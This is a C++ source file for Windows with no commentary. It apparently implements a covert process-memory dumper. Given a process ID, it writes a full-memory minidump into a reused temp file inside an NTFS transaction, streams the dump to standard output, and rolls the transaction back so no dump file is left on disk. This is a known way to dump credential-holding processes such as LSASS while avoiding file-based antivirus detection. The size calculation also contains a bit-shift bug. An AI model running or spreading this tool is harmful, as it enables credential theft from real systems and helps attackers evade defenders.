#include <Windows.h>
#include <dbghelp.h>
#include <ktmw32.h>
#include <string>
#include <vector>

#pragma comment(lib, "Dbghelp.lib")
#pragma comment(lib, "KtmW32.lib")

namespace {
	std::wstring FindWriteableFile() {
		std::wstring searchPath{ L"C:\\Windows\\TEMP\\*.*" };
		WIN32_FIND_DATA findData{ 0 };
		auto find{ FindFirstFileW(searchPath.data(), &findData) };
		do {
			std::wstring filePath{ L"C:\\Windows\\TEMP\\" };
			filePath.append(findData.cFileName);
			auto file{ CreateFileW(filePath.data(), GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0) };
			if (file != INVALID_HANDLE_VALUE) {
				CloseHandle(file);
				return filePath;
			}
		} while (FindNextFileW(find, &findData));
		FindClose(find);
		return std::wstring();
	}
}

class Transaction {
public:
	Transaction() {
		transaction = CreateTransaction(nullptr, 0, 0, 0, 0, 0, nullptr);
	}

	HANDLE OpenExistingFile(const std::wstring& path, DWORD desiredAccess = GENERIC_READ | GENERIC_WRITE) {
		return CreateFileTransactedW(path.data(), desiredAccess, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0, transaction, nullptr, nullptr);
	}

	void Rollback() {
		RollbackTransaction(transaction);
	}

private:
	HANDLE transaction;
};

void main(int argc, char* argv[]) {
	std::vector<std::string> args{ argv, argv + argc };

	auto processId{ std::stoi(args[1], nullptr, 0) };
	auto processHandle{ OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, 0, processId) };
	
	// Open a transacted file
	auto transaction{ Transaction() };
	auto file{ transaction.OpenExistingFile(FindWriteableFile()) };

	// Create a MiniDump and get it's size
	SetEndOfFile(file); // Truncate the file to 0 for GetFileSize to work
	MiniDumpWriteDump(processHandle, processId, file, static_cast<MINIDUMP_TYPE>(MiniDumpWithFullMemory | MiniDumpWithHandleData), nullptr, nullptr, nullptr);
	DWORD fileSizeHigh;
	auto fileSizeLow{ GetFileSize(file, &fileSizeHigh) };

	// Output the file
	auto mapping{ CreateFileMappingW(file, nullptr, PAGE_READONLY, 0, 0, 0) };
	auto fileView{ MapViewOfFile(mapping, FILE_MAP_READ, 0, 0, 0) };
	auto output{ GetStdHandle(STD_OUTPUT_HANDLE) };
	DWORD bytesWritten;
	WriteFile(output, fileView, (fileSizeHigh << 32) | fileSizeLow, &bytesWritten, nullptr);
	CloseHandle(output);
	UnmapViewOfFile(fileView);
	CloseHandle(mapping);

	// Rollback the transaction
	CloseHandle(file);
	transaction.Rollback();
}
